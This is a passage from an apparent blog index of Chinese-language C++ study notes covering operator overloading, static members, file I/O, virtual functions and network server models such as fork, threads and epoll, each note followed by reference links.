<p>An expression x-&gt;m is interpreted as (x.operator-&gt;())-&gt;m for a class object x of type T if T::operator-&gt; exists and if the operator is selected at the best match function by the overload resolution mechanism (13.3).</p>
</blockquote>
<h1 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h1><p>在同一个作用域内，可以声明几个功能类似的同名函数，但是这些同名函数的形式参数（指参数的个数、类型或者顺序）必须不同。您不能仅通过返回类型的不同来重载函数。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://stackoverflow.com/questions/4923270/is-operator-chained-for-pointers/4923639#4923639" target="_blank" rel="noopener">Is operator-&gt; “chained” for pointers? [duplicate]</a>,by stackoverflow.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus静态变量</title>
    <url>/2021/12/14/CPlusPlus%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<p>static 是 C/C++ 中很常用的修饰符，它被用来控制变量的存储方式和可见性。</p>
<p>我们知道在函数内部定义的变量，当程序执行到它的定义处时，编译器为它在栈上分配空间，函数在栈上分配的空间在此函数执行结束时会释放掉，这样就产生了一个问题: 如果想将函数中此变量的值保存至下一次调用时，如何实现？ 最容易想到的方法是定义为全局的变量，但定义一个全局变量有许多缺点，最明显的缺点是破坏了此变量的访问范围（使得在此函数中定义的变量，不仅仅只受此函数控制）。static 关键字则可以很好的解决这个问题。</p>
<p>另外，在 C++ 中，需要一个数据对象为整个类而非某个对象服务,同时又力求不破坏类的封装性,即要求此成员隐藏在类的内部，对外不可见时，可将其定义为静态数据。</p>
<h1 id="c-类静态成员函数调用成员变量"><a href="#c-类静态成员函数调用成员变量" class="headerlink" title="c++类静态成员函数调用成员变量"></a>c++类静态成员函数调用成员变量</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>一种最简单的方法就是在类静态函数的形参列表里面加入类指针，到时候直接传入实例的this指针就能操作类成员变量了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    static void test(A *a)</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;m_a +&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    void hello()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">private:</span><br><span class="line">    static int m_staticA;</span><br><span class="line">    int m_a</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>一开始定义的时候就把实例的this指针复制给一个静态的类指针，这样不用传入this指针直接操作，但是这样如果多个实例都需要操作的时候会出现问题，定义多个变量的时候需要注意静态指针指向的是哪个实例。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    A()</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    static void test()</span><br><span class="line">    &#123;</span><br><span class="line">        m_gA.m_a +&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    void hello()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">private:</span><br><span class="line">    static int m_staticA;</span><br><span class="line">    static A *m_gA;</span><br><span class="line">    int m_a</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">A* A::m_gA&#x3D;NULL;</span><br></pre></td></tr></table></figure>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.runoob.com/w3cnote/cpp-static-usage.html" target="_blank" rel="noopener">C/C++ 中 static 的用法全局变量与局部变量</a>,by runoob.</li>
<li><a href="https://zhuanlan.zhihu.com/p/37439983" target="_blank" rel="noopener">C/C++ 中的static关键字</a>,by Arkin.</li>
<li><a href="https://blog.csdn.net/xxwtiancai/article/details/129288845" target="_blank" rel="noopener">c++类静态成员函数调用成员变量</a>,by xxwtiancai.</li>
<li><a href="https://www.cnblogs.com/vivian187/p/12698252.html" target="_blank" rel="noopener">C++类里面定义一个指向自己的静态成员函数</a>,by JJ_S.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C/C++文件读写操作</title>
    <url>/2021/10/30/CPlusPlus%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="基于C的文件操作"><a href="#基于C的文件操作" class="headerlink" title="基于C的文件操作"></a>基于C的文件操作</h1><h2 id="流式文件操作"><a href="#流式文件操作" class="headerlink" title="流式文件操作"></a>流式文件操作</h2><p>这种方式的文件操作有一个重要的结构FILE，FILE在头文件stdio.h中定义。</p>
<h2 id="I-O文件操作"><a href="#I-O文件操作" class="headerlink" title="I/O文件操作"></a>I/O文件操作</h2><p>这是C提供的另一种文件操作，它是通过直接存/取文件来完成对文件的处理，而上篇所说流式文件操作是通过缓冲区来进行；流式文件操作是围绕一个FILE指 针来进行，而此类文件操作是围绕一个文件的“句柄”来进行。</p>
<h1 id="基于C-的文件操作"><a href="#基于C-的文件操作" class="headerlink" title="基于C++的文件操作"></a>基于C++的文件操作</h1><p>在C++中，有一个stream这个类，所有的I/O都以这个“流”类为基础的，包括我们要认识的文件I/O。</p>
<h1 id="基于WINAPI的文件操作"><a href="#基于WINAPI的文件操作" class="headerlink" title="基于WINAPI的文件操作"></a>基于WINAPI的文件操作</h1><p>WINAPI提供了两种文件操作函数，一组是为了和16位程序兼容，这种函数比较简单；而另一种是专门为32位程序设计。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/liushui-sky/p/9014993.html" target="_blank" rel="noopener">C/C++文件输入输出操作——FILE*、fstream、windowsAPI</a>,by 苦涩的茶.</li>
<li><a href="https://www.cnblogs.com/jikexianfeng/articles/5651661.html" target="_blank" rel="noopener">C++的iostream标准库介绍+使用详解(转)</a>,by 极客先锋.</li>
<li><a href="https://www.cnblogs.com/hanyonglu/archive/2011/04/28/2031271.html" target="_blank" rel="noopener">malloc和free函数详解</a>,by Healtheon.</li>
<li><a href="https://www.cnblogs.com/hanyonglu/archive/2011/04/12/2014212.html" target="_blank" rel="noopener">C/C++堆、栈及静态数据区详解</a>,by Healtheon.</li>
<li><a href="https://blog.csdn.net/dreamiond/article/details/73181115" target="_blank" rel="noopener">C++——使用变量作为数组长度</a>,by dreamiond.</li>
<li><a href="https://blog.csdn.net/u014465639/article/details/70241850" target="_blank" rel="noopener">C++ STL中容器的使用全面总结</a>,by jimofanhua0000.</li>
<li><a href="https://blog.csdn.net/u014082714/article/details/44347297" target="_blank" rel="noopener">c++ new/delete的用法</a>,by liuhmmjj.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++虚函数与纯虚函数</title>
    <url>/2019/09/15/CPlusPlus%E8%99%9A%E5%87%BD%E6%95%B0%E4%B8%8E%E7%BA%AF%E8%99%9A%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>在面向对象程序设计领域，C++、Object Pascal 等语言中有<strong>虚函数</strong>（英语：virtual function）或虚方法（英语：virtual method）的概念。这种函数或方法可以被子类继承和覆盖，通常使用动态调度实现。</p>
<p><strong>纯虚函数或纯虚方法</strong>是一个需要被非抽象的派生类覆盖（override）的虚函数. 包含纯虚方法的类被称作抽象类; 抽象类不能被直接实例化。 一个抽象基类的一个子类只有在所有的纯虚函数在该类(或其父类)内给出实现时, 才能直接实例化. 纯虚方法通常只有声明(签名)而没有定义(实现)，但有特例情形要求纯虚函数必须给出函数体定义.</p>
<h1 id="虚函数示例"><a href="#虚函数示例" class="headerlink" title="虚函数示例"></a>虚函数示例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># include &lt;iostream&gt;</span><br><span class="line"># include &lt;vector&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">class Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    virtual void eat() const &#123; cout &lt;&lt; &quot;I eat like a generic Animal.&quot; &lt;&lt; endl; &#125;</span><br><span class="line">    virtual ~Animal() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">class Wolf : public Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    void eat() const &#123; cout &lt;&lt; &quot;I eat like a wolf!&quot; &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">class Fish : public Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    void eat() const &#123; cout &lt;&lt; &quot;I eat like a fish!&quot; &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">class GoldFish : public Fish</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    void eat() const &#123; cout &lt;&lt; &quot;I eat like a goldfish!&quot; &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class OtherAnimal : public Animal</span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    std::vector&lt;Animal*&gt; animals;</span><br><span class="line">    animals.push_back( new Animal() );</span><br><span class="line">    animals.push_back( new Wolf() );</span><br><span class="line">    animals.push_back( new Fish() );</span><br><span class="line">    animals.push_back( new GoldFish() );</span><br><span class="line">    animals.push_back( new OtherAnimal() );</span><br><span class="line"> </span><br><span class="line">    for( std::vector&lt;Animal*&gt;::const_iterator it &#x3D; animals.begin();</span><br><span class="line">       it !&#x3D; animals.end(); ++it) </span><br><span class="line">    &#123;</span><br><span class="line">        (*it)-&gt;eat();</span><br><span class="line">        delete *it;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下是虚函数 Animal::eat() 的输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I eat like a generic Animal.</span><br><span class="line">I eat like a wolf!</span><br><span class="line">I eat like a fish!</span><br><span class="line">I eat like a goldfish!</span><br><span class="line">I eat like a generic Animal.</span><br></pre></td></tr></table></figure>

<h1 id="纯虚函数示例"><a href="#纯虚函数示例" class="headerlink" title="纯虚函数示例"></a>纯虚函数示例</h1><p>在C++语言中, 纯虚函数用一种特别的语法[=0]定义。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Abstract &#123;</span><br><span class="line">public:</span><br><span class="line">   virtual void pure_virtual() &#x3D; 0;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>纯虚函数的定义仅提供方法的原型. 虽然在抽象类中通常不提供纯虚函数的实现, 但是抽象类中可以包含其实现, 而且可以不在声明的同时给出定义[2]. 每个非抽象子类仍然需要重载该方法, 抽象类中实现的调用可以采用以下这种形式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Abstract::pure_virtual() &#123;</span><br><span class="line">  &#x2F;&#x2F; do something</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Child : public Abstract &#123;</span><br><span class="line">  virtual void pure_virtual(); &#x2F;&#x2F; no longer abstract, this class may be</span><br><span class="line">                               &#x2F;&#x2F; instantiated.</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void Child::pure_virtual() &#123;</span><br><span class="line">  Abstract::pure_virtual(); &#x2F;&#x2F; the implementation in the abstract class </span><br><span class="line">                            &#x2F;&#x2F; is executed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/Hackbuteer1/article/details/7558868" target="_blank" rel="noopener">虚函数和纯虚函数的区别</a>,by hackbuteer1.</li>
<li><a href="https://zh.wikipedia.org/wiki/虚函数" target="_blank" rel="noopener">虚函数</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/starlee/article/details/619827" target="_blank" rel="noopener">C++中虚析构函数的作用</a>,by StarLee.</li>
<li><a href="https://blog.csdn.net/weiwangchao_/article/details/8730199" target="_blank" rel="noopener">开源免费的C/C++网络库(c/c++ sockets library) 七剑下天山</a>,by 工程师WWW.</li>
<li><a href="https://www.cnblogs.com/JMLiu/p/6241427.html" target="_blank" rel="noopener">VS2010中属性页中，C/C++ –&gt;预处理器定义</a>,by J.M.Liu.</li>
<li><a href="https://blog.csdn.net/zzwdkxx/article/details/44244535" target="_blank" rel="noopener">深入理解C/C++混合编程（关于#ifdef __cplusplus extern “C” {…}的用法）</a>,by zzwdkxx.</li>
<li><a href="https://wiki.jikexueyuan.com/project/visual-studio/11.html" target="_blank" rel="noopener">带你玩转 Visual Studio——带你多工程开发</a>,by luoweifu.</li>
<li><a href="https://www.cnblogs.com/carsonzhu/p/5275909.html" target="_blank" rel="noopener">c++中冒号（：）和双冒号（::）的用法</a>,by 小金乌会发光－Z&amp;M.</li>
<li><a href="https://blog.csdn.net/chaipp0607/article/details/71525599" target="_blank" rel="noopener">C++ 构造函数总结</a>,by chaibubble.</li>
<li><a href="http://c.biancheng.net/cpp/biancheng/view/229.html" target="_blank" rel="noopener">详谈C++保护成员和保护继承</a>,by C语言中文网.</li>
<li><a href="https://blog.csdn.net/BjarneCpp/article/details/76044493" target="_blank" rel="noopener">c++ 内联函数（一看就懂）</a>,by 兴趣斗士.</li>
<li><a href="https://www.zhihu.com/tardis/zm/art/380147337?source_id=1003" target="_blank" rel="noopener">浅析C++类的内存布局</a>,by 冯Jungle.</li>
<li><a href="https://www.cnblogs.com/qg-whz/p/4909359.html" target="_blank" rel="noopener">图说C++对象模型：对象内存布局详解</a>,by melonstreet.</li>
<li><a href="https://coolshell.cn/articles/12176.html" target="_blank" rel="noopener">C++ 对象的内存布局</a>,by 陈皓.</li>
<li><a href="https://blog.csdn.net/dxpqxb/article/details/102794132" target="_blank" rel="noopener">C++类对象的内存布局</a>,by 一叶知秋dong.</li>
<li><a href="https://blog.csdn.net/luolaihua2018/article/details/110736211" target="_blank" rel="noopener">C++中类所占的内存大小以及成员函数的存储位置</a>,by SOC罗三炮.</li>
<li><a href="https://blog.csdn.net/qq_21989927/article/details/110139636" target="_blank" rel="noopener">struct的用法和struct的对齐原则</a>,by 马小超i.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++高性能网络编程</title>
    <url>/2019/10/26/CPlusPlus%E9%AB%98%E6%80%A7%E8%83%BD%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<p>最近需要用C++编写一个网络程序，因此将网络编程的相关知识整理学习一下。</p>
<h1 id="Socket编程"><a href="#Socket编程" class="headerlink" title="Socket编程"></a>Socket编程</h1><p>Socket 是对 TCP/IP 协议族的一种封装，是应用层与TCP/IP协议族通信的中间软件抽象层。从设计模式的角度看来，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议。</p>
<p>Socket 还可以认为是一种网络间不同计算机上的进程通信的一种方法，利用三元组（ip地址，协议，端口）就可以唯一标识网络中的进程，网络中的进程通信可以利用这个标志与其它进程进行交互。</p>
<p>Socket 起源于 Unix ，Unix/Linux 基本哲学之一就是“一切皆文件”，都可以用“打开(open) –&gt; 读写(write/read) –&gt; 关闭(close)”模式来进行操作。因此 Socket 也被处理为一种特殊的文件。</p>
<h2 id="Socket类型"><a href="#Socket类型" class="headerlink" title="Socket类型"></a>Socket类型</h2><p>创建 socket 的时候需要指定 socket 的类型，一般有三种：</p>
<ul>
<li>SOCK_STREAM：面向连接的稳定通信，底层是 TCP 协议，我们会一直使用这个。</li>
<li>SOCK_DGRAM：无连接的通信，底层是 UDP 协议，需要上层的协议来保证可靠性。</li>
<li>SOCK_RAW：更加灵活的数据控制，能让你指定 IP 头部</li>
</ul>
<h2 id="Socket编程接口"><a href="#Socket编程接口" class="headerlink" title="Socket编程接口"></a>Socket编程接口</h2><ul>
<li>socket()：创建socket</li>
<li>bind()：绑定socket到本地地址和端口，通常由服务端调用</li>
<li>listen()：TCP专用，开启监听模式</li>
<li>accept()：TCP专用，服务器等待客户端连接，一般是阻塞态</li>
<li>connect()：TCP专用，客户端主动连接服务器</li>
<li>send()：TCP专用，发送数据</li>
<li>recv()：TCP专用，接收数据</li>
<li>sendto()：UDP专用，发送数据到指定的IP地址和端口</li>
<li>recvfrom()：UDP专用，接收数据，返回数据远端的IP地址和端口</li>
<li>closesocket()：关闭socket</li>
</ul>
<h2 id="Socket通信流程"><a href="#Socket通信流程" class="headerlink" title="Socket通信流程"></a>Socket通信流程</h2><p align="center">
    <img src="images/socket.jpg" width="60%" alt="TCP通信流程"/>
</p>
<center>图1 TCP通信流程</center>

<p align="center">
    <img src="images/udp.png" width="60%" alt="UDP通信流程"/>
</p>
<center>图2 UDP通信流程</center>

<h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h2><p>不同的计算机对数据的存储格式不一样，比如 32 位的整数 0x12345678，可以在内存里从高到低存储为 12-34-56-78 或者从低到高存储为 78-56-34-12。</p>
<p>但是这对于网络中的数据来说就带来了一个严重的问题，当机器从网络中收到 12-34-56-78 的数据时，它怎么知道这个数据到底是什么意思？</p>
<p>解决的方案也比较简单，在传输数据之前和接受数据之后，必须调用 htonl/htons 或 ntohl/ntohs 先把数据转换成网络字节序或者把网络字节序转换为机器的字节序。</p>
<ul>
<li>TCP 和 UDP 的端口是互不干扰的，也就是说系统可以同时开启 TCP 80 端口和 UDP 80 端口。</li>
<li>socket 不属于任何一层网络协议，它是对 TCP 层的封装，方便网络编程。</li>
</ul>
<h1 id="网络编程模型"><a href="#网络编程模型" class="headerlink" title="网络编程模型"></a>网络编程模型</h1><p>常用的服务器应用分类如下：</p>
<p align="center">
    <img src="images/server_class.png" width="90%" alt="服务器应用分类"/>
</p>
<center>图3 服务器应用分类</center>

<h2 id="同步阻塞迭代模型"><a href="#同步阻塞迭代模型" class="headerlink" title="同步阻塞迭代模型"></a>同步阻塞迭代模型</h2><p>同步阻塞迭代模型是最简单的一种IO模型，其核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind(srvfd);</span><br><span class="line">listen(srvfd);</span><br><span class="line">for(;;)</span><br><span class="line">&#123;</span><br><span class="line">    clifd &#x3D; accept(srvfd,...); &#x2F;&#x2F;开始接受客户端来的连接</span><br><span class="line">    read(clifd,buf,...); &#x2F;&#x2F;从客户端读取数据</span><br><span class="line">    dosomthingonbuf(buf);</span><br><span class="line">    write(clifd,buf)&#x2F;&#x2F;发送数据到客户端</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的程序存在如下一些弊端：</p>
<ol>
<li>如果没有客户端的连接请求，进程会阻塞在accept系统调用处，程序不能执行其他任何操作。(系统调用使得程序从用户态陷入内核态）</li>
<li>在与客户端建立好一条链路后，通过read系统调用从客户端接受数据，而客户端合适发送数据过来是不可控的。如果客户端迟迟不发生数据过来，则程序同样会阻塞在read调用，此时，如果另外的客户端来尝试连接时，都会失败。</li>
<li>同样的道理，write系统调用也会使得程序出现阻塞(例如：客户端接受数据异常缓慢，导致写缓冲区满，数据迟迟发送不出)。</li>
</ol>
<h2 id="多进程并发模型"><a href="#多进程并发模型" class="headerlink" title="多进程并发模型"></a>多进程并发模型</h2><p>多进程并发模型在同步阻塞迭代模型的基础上进行了一些改进，以避免是程序阻塞在read系统调用上。核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind(srvfd);</span><br><span class="line">listen(srvfd);</span><br><span class="line">for(;;)&#123;</span><br><span class="line">clifd &#x3D; accept(srvfd,...); &#x2F;&#x2F;开始接受客户端来的连接</span><br><span class="line">ret &#x3D; fork();</span><br><span class="line">switch( ret )</span><br><span class="line">&#123;</span><br><span class="line">    case -1 :</span><br><span class="line">        do_err_handler();</span><br><span class="line">        break;</span><br><span class="line">    case 0: &#x2F;&#x2F; 子进程</span><br><span class="line">        client_handler(clifd);</span><br><span class="line">        break ;</span><br><span class="line">    default : &#x2F;&#x2F; 父进程</span><br><span class="line">        close(clifd);</span><br><span class="line">        continue ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">void client_handler(clifd)</span><br><span class="line">&#123;</span><br><span class="line">    read(clifd,buf,...); &#x2F;&#x2F;从客户端读取数据</span><br><span class="line">    dosomthingonbuf(buf);</span><br><span class="line">    write(clifd,buf)&#x2F;&#x2F;发送数据到客户端</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述程序在accept系统调用时，如果没有客户端来建立连接，会阻塞在accept处。一旦某个客户端连接建立起来，则立即开启一个新的进程来处理与这个客户的数据交互。避免程序阻塞在read调用，而影响其他客户端的连接。</p>
<h2 id="多线程并发模型"><a href="#多线程并发模型" class="headerlink" title="多线程并发模型"></a>多线程并发模型</h2><p>在多进程并发模型中，每一个客户端连接开启fork一个进程，若客户端连接较大，则系统依然将不堪负重。通过多线程(或线程池)并发模型，可以在一定程度上改善这一问题。</p>
<p>在服务端的线程模型实现方式一般有三种：</p>
<ul>
<li>按需生成(来一个连接生成一个线程)</li>
<li>线程池(预先生成很多线程)</li>
<li>Leader follower（LF）</li>
</ul>
<p>以第一种为例，其核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void *thread_callback( void *args ) &#x2F;&#x2F;线程回调函数</span><br><span class="line">&#123;</span><br><span class="line">    int clifd &#x3D; *(int *)args ;</span><br><span class="line">    client_handler(clifd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void client_handler(clifd)</span><br><span class="line">&#123;</span><br><span class="line">    read(clifd,buf,...); &#x2F;&#x2F;从客户端读取数据</span><br><span class="line">    dosomthingonbuf(buf);</span><br><span class="line">    write(clifd,buf)&#x2F;&#x2F;发送数据到客户端</span><br><span class="line">&#125;</span><br><span class="line">bind(srvfd);</span><br><span class="line">listen(srvfd);</span><br><span class="line">for(;;)</span><br><span class="line">&#123;</span><br><span class="line">    clifd &#x3D; accept();</span><br><span class="line">    pthread_create(...,thread_callback,&amp;clifd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端分为主线程和工作线程，主线程负责accept()连接，而工作线程负责处理业务逻辑和流的读取等。因此，即使在工作线程阻塞的情况下，也只是阻塞在线程范围内，对继续接受新的客户端连接不会有影响。</p>
<p>第二种实现方式，通过线程池的引入可以避免频繁的创建、销毁线程，能在很大程序上提升性能。</p>
<p>但多线程模型先天具有如下缺点：</p>
<ul>
<li>稳定性相对较差。一个线程的崩溃会导致整个程序崩溃。</li>
<li>临界资源的访问控制，在加大程序复杂性的同时，锁机制的引入会是严重降低程序的性能。性能上可能会出现“辛辛苦苦好几年，一夜回到解放前”的情况。</li>
</ul>
<h2 id="IO多路复用模型"><a href="#IO多路复用模型" class="headerlink" title="IO多路复用模型"></a>IO多路复用模型</h2><p>多进程模型和多线程(线程池)模型每个进程/线程只能处理一路IO，在服务器并发数较高的情况下，过多的进程/线程会使得服务器性能下降。而通过多路IO复用，能使得一个进程同时处理多路IO，提升服务器吞吐量。这是一种进程预先告知内核的能力，让内核发现进程指定的一个或多个IO条件就绪了，就通知进程。使得一个进程能在一连串的事件上等待。</p>
<p>IO复用的实现方式目前主要有select、poll和epoll。</p>
<p>select和poll的原理基本相同：</p>
<ul>
<li><p>注册待侦听的fd(这里的fd创建时最好使用非阻塞)</p>
</li>
<li><p>每次调用都去检查这些fd的状态，当有一个或者多个fd就绪的时候返回</p>
</li>
<li><p>返回结果中包括已就绪和未就绪的fd</p>
</li>
</ul>
<p>相比select，poll解决了单个进程能够打开的文件描述符数量有限制这个问题：select受限于FD_SIZE的限制，如果修改则需要修改这个宏重新编译内核；而poll通过一个pollfd数组向内核传递需要关注的事件，避开了文件描述符数量限制。此外，select和poll共同具有的一个很大的缺点就是包含大量fd的数组被整体复制于用户态和内核态地址空间之间，开销会随着fd数量增多而线性增大。</p>
<p>epoll的出现，解决了select、poll的缺点：</p>
<ul>
<li><p>基于事件驱动的方式，避免了每次都要把所有fd都扫描一遍。</p>
</li>
<li><p>epoll_wait只返回就绪的fd。</p>
</li>
<li><p>epoll使用nmap内存映射技术避免了内存复制的开销。</p>
</li>
<li><p>epoll的fd数量上限是操作系统的最大文件句柄数目,这个数目一般和内存有关，通常远大于1024。</p>
</li>
</ul>
<p>总结：</p>
<ul>
<li>select：支持注册 FD_SETSIZE(1024) 个 socket。</li>
<li>poll： poll 作为 select 的替代者，最大的区别就是，poll 不再限制 socket 数量。</li>
<li>epoll：epoll 能直接返回具体的准备好的通道，时间复杂度 O(1)。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/u010913001/article/details/52487938" target="_blank" rel="noopener">C++网络框架和库</a>,by 帝王铠.</li>
<li><a href="https://juejin.im/post/59e47ce36fb9a0451f2ffee8" target="_blank" rel="noopener">C++ 高性能服务器网络框架设计细节</a>,by 范蠡.</li>
<li><a href="https://www.jianshu.com/p/ee5b34870eba" target="_blank" rel="noopener">值得推荐的C/C++框架和库 (真的很强大)</a>,by tibet889.</li>
<li><a href="https://zhuanlan.zhihu.com/p/71707672" target="_blank" rel="noopener">有哪些值得推荐的c/c++开源框架与库</a>,by 零声学院.</li>
<li><a href="https://www.zhihu.com/question/20124494" target="_blank" rel="noopener">有什么适合提高 C/C++ 网络编程能力的开源项目推荐？</a>,by zhihu.</li>
<li><a href="https://blog.csdn.net/lijinqi1987/article/details/71214974" target="_blank" rel="noopener">网络库libevent、libev、libuv对比</a>,by 小麒麟666.</li>
<li><a href="https://blog.csdn.net/tjm1017/article/details/88219576" target="_blank" rel="noopener">libevent、libev、libuv、IOCP、asio、muduo优劣分析、QT下编译libevent静态库</a>,by 雒珣.</li>
<li><a href="https://lotabout.me/2018/reactor-pattern/" target="_blank" rel="noopener">Reactor 模式简介</a>,by lotabou.</li>
<li><a href="https://segmentfault.com/a/1190000002715832" target="_blank" rel="noopener">IO设计模式：Reactor和Proactor对比</a>,by 大CC.</li>
<li><a href="https://www.jianshu.com/p/96c0b04941e2" target="_blank" rel="noopener">Proactor和Reactor模型</a>,by wiseAaron.</li>
<li><a href="https://www.zhihu.com/question/26943938" target="_blank" rel="noopener">如何深刻理解reactor和proactor？</a>,by zhihu.</li>
<li><a href="http://senlinzhan.github.io/2017/08/12/libevent/" target="_blank" rel="noopener">Libevent 编程指南</a>,by senlin.</li>
<li><a href="https://zhuanlan.zhihu.com/p/20315482" target="_blank" rel="noopener">网络编程（三）：从libevent到事件通知机制</a>,by auxten.</li>
<li><a href="https://www.ibm.com/developerworks/cn/aix/library/au-libev/index.html" target="_blank" rel="noopener">使用 libevent 和 libev 提高网络应用性能</a>,by Martin C. Brown.</li>
<li><a href="https://zhuanlan.zhihu.com/p/50497450" target="_blank" rel="noopener">兄déi，libuv了解一下</a>,by 宋光宇.</li>
<li><a href="http://blog.tubumu.com/2017/03/11/libuv-analysis-02/" target="_blank" rel="noopener">Libuv 源码分析(2):源码一览</a>,by Tubumu.</li>
<li><a href="https://www.cnblogs.com/losophy/p/9202815.html" target="_blank" rel="noopener">IO设计模式：Actor、Reactor、Proactor</a>,by _raindrop.</li>
<li><a href="http://www.thinkingyu.com/articles/Proactor/" target="_blank" rel="noopener">Proactor网络编程模式歪解</a>,by WUYU.</li>
<li><a href="https://www.s0nnet.com/archives/deep-understanding-of-reactor-design-patterns" target="_blank" rel="noopener">深入理解Reactor模式</a>,by 独木の白帆.</li>
<li><a href="https://cizixs.com/2015/03/29/basic-socket-programming/" target="_blank" rel="noopener">socket 编程基础知识</a>,by cizixs.</li>
<li><a href="https://zhuanlan.zhihu.com/p/43933717" target="_blank" rel="noopener">一文读懂高性能网络编程中的I/O模型</a>,by Jack Jiang.</li>
<li><a href="https://blog.csdn.net/drdairen/article/details/53694550" target="_blank" rel="noopener">几种典型的服务器网络编程模型归纳(select poll epoll)</a>,by DrStream.</li>
<li><a href="https://www.cnblogs.com/wade-luffy/p/6106030.html" target="_blank" rel="noopener">Linux IO模型和网络编程模型</a>,by wade&amp;luffy.</li>
<li><a href="https://blog.csdn.net/weiwangchao_/article/details/8730199" target="_blank" rel="noopener">开源免费的C/C++网络库(c/c++ sockets library) 七剑下天山</a>,by 工程师WWW.</li>
<li><a href="https://www.cnblogs.com/DOMLX/p/9601511.html" target="_blank" rel="noopener">c++ 网络编程（一）TCP/UDP windows/linux 下入门级socket通信 客户端与服务端交互代码</a>,by aircraft.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus默认参数</title>
    <url>/2021/11/21/CPlusPlus%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<p>函数的默认参数值，即在定义参数的时候同时给它一个初始值。在调用函数的时候，我们可以省略含有默认值的参数。也就是说，如果用户指定了参数值，则使用用户指定的值，否则使用默认参数的值。</p>
